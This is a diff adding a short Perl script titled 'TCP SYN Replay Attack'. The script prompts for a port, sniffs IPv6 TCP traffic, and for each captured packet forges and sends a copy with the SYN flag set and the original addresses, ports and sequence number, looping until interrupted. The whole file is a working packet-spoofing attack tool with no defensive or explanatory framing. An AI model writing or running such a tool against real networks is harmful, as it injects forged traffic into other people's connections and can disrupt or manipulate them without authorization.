@@ -1,0 +1,53 @@
+# TCP SYN Replay Attack
+
+print "What TCP port to search on? ";
+my $port = <STDIN>;
+chomp $port;
+print "\n";
+
+if (($port !~ /^\d{1,5}$/) || ($port < 1) || ($port > 65535)) {
+    print "Not a valid port, matching all ...\n";
+    $port = 0;
+}
+
+$port = $port || 0;
+
+my $STOP = 0;
+local $SIG{'INT'} = sub {
+    $STOP = 1;
+};
+
+while (!$STOP) {
+    my $r;
+    if ($port) {
+        $r = sniff count=>1,filter=>"ip6 and tcp port $port";
+    } else {
+        $r = sniff count=>1,filter=>'ip6 and tcp';
+    }
+
+    print "----REQUEST----\n";
+    print $r->print . "\n";
+
+    my $e = ETHER(
+        src  => $r->ref->{ETH}->src,
+        dst  => $r->ref->{ETH}->dst,
+        type => NF_ETH_TYPE_IPv6
+    );
+    my $ipv6 = IPv6(
+        src => $r->ref->{IPv6}->src,
+        dst => $r->ref->{IPv6}->dst
+    );
+    my $tcp = TCP(
+        src   => $r->ref->{TCP}->src,
+        dst   => $r->ref->{TCP}->dst,
+        flags => NF_TCP_FLAGS_SYN,
+        seq   => $r->ref->{TCP}->seq
+    );
+
+    my $p = packet $e,$ipv6,$tcp;
+
+    print "----REPLY----\n";
+    decode $p;
+
+    sendp $p;
+}
